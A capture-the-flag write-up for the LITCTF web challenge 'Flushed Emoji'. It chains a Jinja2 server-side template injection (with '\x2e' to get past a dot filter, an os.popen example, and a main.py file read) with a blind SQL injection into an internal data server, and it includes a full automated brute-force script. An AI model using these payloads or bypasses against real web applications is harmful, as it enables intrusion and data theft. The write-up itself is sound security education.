# web/Flushed Emoji

## Challenge

Flushed emojis are so cool! Learn more about them [here](http://litctf.live:31781/)!

[FlushedEmojis.zip](https://drive.google.com/uc?export=download&id=1agW3a0-T4VsSJwJVTZ-dWSRLE_byxJya)

## Solution

The solution to this problem is quite long, so I will break it up into four parts.

### Introduction

The HTML of the pages doesn't tell us much, so we'll want to dig into the source code. From the zip file provided, we can see that the challenge consists of two servers: a main server, where your username/password request is processed, and a data server, where the flag is stored.

There are two vulnerabilities we could be able to exploit here. The first one is in the `main.py` file of the data server:

```py
# [irrelevant stuff]

cur.execute(
    '''INSERT INTO users (username,password) VALUES ("flag","''' + flag + '''") '''
)
@app.route('/runquery', methods=['POST'])
def runquery():
  request_data = request.get_json()
  username = request_data["username"];
  password = request_data["password"];

  print(password);
  
  cur.execute("SELECT * FROM users WHERE username='" + username + "' AND password='" + password + "'");

  rows = cur.fetchall()
  if(len(rows) > 0):
    return "True";
  return "False";

app.run(host='127.0.0.1',port=8080,debug=True)
```

Note that the code uses simple string concatenation for an SQL query. This is a clear sign that we need to do SQL injection.

However, the method doesn't actually return the flag; it only returns `True` or `False`, depending on if the flag is matched by the query. This means we'll need to figure out the flag character-by-character, similar to [Amy The Hedgehog](Amy%20The%20Hedgehog.md).

The second vulnerability is in the `main.py` file of the main server:

```py
# [irrelevant stuff]

def alphanumericalOnly(str):
  return re.sub(r'[^a-zA-Z0-9]', '', str);

@app.route('/', methods=['GET', 'POST'])
def login():
  if request.method == 'POST':

    username = request.form['username']
    password = request.form['password']

  
    if('.' in password):
      return render_template_string("lmao no way you have . in your password LOL");

    r = requests.post('[Other server IP]', json={"username": alphanumericalOnly(username),"password": alphanumericalOnly(password)}); 
    print(r.text);
    if(r.text == "True"):
      return render_template_string("OMG you are like so good at guessing our flag I am lowkey jealoussss.");
    return render_template_string("ok thank you for your info i have now sold your password (" + password + ") for 2 donuts :)");

  return render_template("index.html");


app.run(host='127.0.0.1',port=8081,debug=True)
```

We notice again that string concatenation is used, this time in the `render_template_string` function. A quick search for "render_template_string vulnerability" reveals [this link](https://blog.nvisium.com/injecting-flask), showing that we can use `{{` and `}}` for RCE. Indeed, if we go to the webpage and enter nothing as the username and `{{1+2}}` as the password, the website will say `ok thank you for your info i have now sold your password (3) for 2 donuts :)`!

However, there are a few problems. The first problem is that the server doesn't handle any requests with the `.` in it. So, it appears that whatever payload we give, we can't have the `.` character in it.

To get around this, we initially tried using `getattr` and `exec`. However, the functionality of this RCE seems quite limited. For example, if we try `{{chr(97)}}`, the server will respond with an `Internal Server Error`. `getattr` and `exec` also don't work.

Luckily, some more searching reveals that `render_template_string` uses jinja2 for templates, and another search for "jinja2 injection" reveals [this](https://www.onsecurity.io/blog/server-side-template-injection-with-jinja2/) site. Scrolling down, we can see that the site has the following code:

> If the waf blocks ".": `{{request['application']['__globals__']['__builtins__']['__import__']('os')['popen']('id')['read']()}}`

Perfect! We'll be using a payload like this to get our flag. Now, it's time to get to work.

### Getting the data server IP

You'll notice in the main server code that the other server's IP is censored. Also, we can't use the code to directly send a request that would inject SQL into the data server, because the contents of our request are stripped to only alphanumeric characters before they're sent over. This means we'll have to figure out the data server IP so we can send requests there ourselves.

Inspired by the payload above, we can type this into the `password` blank to read the contents of `main.py` (note the use of `'\x2e'` to bypass the `.` filter):

```
{{request['application']['__globals__']['__builtins__']['open']('main\x2epy')['read']()}}
```

which returns this:

```
ok thank you for your info i have now sold your password (import sqlite3 from flask import Flask, render_template, render_template_string, redirect, url_for, request import requests; import re; app = Flask(__name__) def alphanumericalOnly(str): return re.sub(r'[^a-zA-Z0-9]', '', str); @app.route('/', methods=['GET', 'POST']) def login(): if request.method == 'POST': username = request.form['username'] password = request.form['password'] if('.' in password): return render_template_string("lmao no way you have . in your password LOL"); r = requests.post('http://172.24.0.8:8080/runquery', json={"username": alphanumericalOnly(username),"password": alphanumericalOnly(password)}); print(r.text); if(r.text == "True"): return render_template_string("OMG you are like so good at guessing our flag I am lowkey jealoussss."); return render_template_string("ok thank you for your info i have now sold your password (" + password + ") for 2 donuts :)"); return render_template("index.html"); @app.before_request def log_request_info():app.logger.warning(f'{request.remote_addr} - {request.headers["X-Real-IP"]} - {request.method} {request.path} |{request.query_string.decode()}| |{request.get_data().decode()}|') ) for 2 donuts :)
```

That doesn't really look like the password we put in, but we have the data server IP now: `http://172.24.0.8:8080/runquery`.

### Injecting SQL into the data server

We can quickly figure out that we can't actually connect to `http://172.24.0.8:8080/runquery` directly, by running the following code locally:

```py
import requests
r = requests.post("http://172.24.0.8:8080/runquery", json={"username":"","password":""})
```

It times out, which means the only way we can inject SQL into the data server is via the main server.

Since in the code, the request is stripped to alphanumeric before being sent over to the data server, we'll want to just use the template injection to send another request over:

```
{{request['application']['__globals__']['__builtins__']['__import__']('requests')['post']('http://172\x2e24\x2e0\x2e8:8080/runquery',json={'username':'','password':''})['text']}}
```

Putting this into the `password` field gives:

```
ok thank you for your info i have now sold your password (False) for 2 donuts :)
```

so sending the requests is working!

Next, let's try some basic SQL injection:

```
{{request['application']['__globals__']['__builtins__']['__import__']('requests')['post']('http://172\x2e24\x2e0\x2e8:8080/runquery',json={'username':'','password':"' OR '1'='1"})['text']}}
```

The data server should receive a blank username and a password of `' OR '1'='1`, which will be evaluated to

```py
cur.execute("SELECT * FROM users WHERE username='' AND password='' OR '1'='1'");
```

and since `AND` is evaluated before `OR`, the result should be `True`. Let's try inputting this payload into the `password` field:

```
ok thank you for your info i have now sold your password (True) for 2 donuts :)
```

Looking good!

Finally, we can try actually figuring out the letters of the flag. In [Amy The Hedgehog](Amy%20The%20Hedgehog.md), we used the `LIKE` keyword to test if our guess was a prefix of the flag. Here, however, we found it more convenient to use the `SUBSTR` keyword to check individual characters of the flag, since `LIKE` is case-insensitive. (Also, some characters, like `_`, need to be escaped when using `LIKE`, which is annoying.)

For example, we know the first character of the flag is `L`. Let's check that using the `SUBSTR` function (note that SQL uses 1-indexed strings, rather than 0-indexed):

```
{{request['application']['__globals__']['__builtins__']['__import__']('requests')['post']('http://172\x2e24\x2e0\x2e8:8080/runquery',json={'username':'','password':"' OR SUBSTR(password,1,1)='L"})['text']}}
```

Output:

```
ok thank you for your info i have now sold your password (True) for 2 donuts :)
```

Now, we're ready to finish off the problem.

### The finale

We can write a Python script to automate the process of getting the flag:

```py
import requests

chars = "QWERTYUIOPASDFGHJKLZXCVBNMqwertyuiopasdfghjklzxcvbnm1234567890{}.,_?!" # all the characters that could be in the flag

payload1 = '''{{request['application']['__globals__']['__builtins__']['__import__']('requests')['post']('http://172\\x2e24\\x2e0\\x2e8:8080/runquery',json={'username':'','password':"' OR SUBSTR(password,'''
payload2 = ",1)='"
payload3 = '''"})['text']}}''' # three sections of our payload

i = 1 # the index we're starting from

while True:
    foundMatch = False # if we've found a match for this character
    for j in chars:
        if j == '.': payload = payload1 + str(i) + payload2 + '\\x2e' + payload3 # make sure to circumvent the . filter!
        else: payload = payload1 + str(i) + payload2 + j + payload3 # the full payload we're sending
        r = requests.post('http://litctf.live:31781/', data={'username':'', 'password':payload}) # send payload to main server
        if r.text.find("True") != -1:
            # we found the correct character!
            print(f"Character at position {i} is {j}")
            foundMatch = True
            i += 1
            break
    if not foundMatch:
        # we didn't find a match this iteration, so the flag must be done
        break
```

(If you get an error in the middle of the Python script, just modify `i` to be the index that it errored at and try again.)

After some patience and restarts of the program, we get this:

```
Character at position 1 is L
Character at position 2 is I
Character at position 3 is T
Character at position 4 is C
Character at position 5 is T
Character at position 6 is F
Character at position 7 is {
Character at position 8 is f
Character at position 9 is l
Character at position 10 is u
Character at position 11 is s
Character at position 12 is h
Character at position 13 is 3
Character at position 14 is d
Character at position 15 is _
Character at position 16 is 3
Character at position 17 is m
Character at position 18 is 0
Character at position 19 is j
Character at position 20 is i
Character at position 21 is _
Character at position 22 is o
Character at position 23 is .
Character at position 24 is 0
Character at position 25 is }
```

...from which we can just read off our flag.

*Fun fact:* In contest, we initially used `LIKE` instead of `SUBSTR`. Also, we forgot to circumvent the `.` filter in the Python solve script. These two mistakes combined made us solve the problem about 24 hours later than we should have.

## Flag

`LITCTF{flush3d_3m0ji_o.0}`
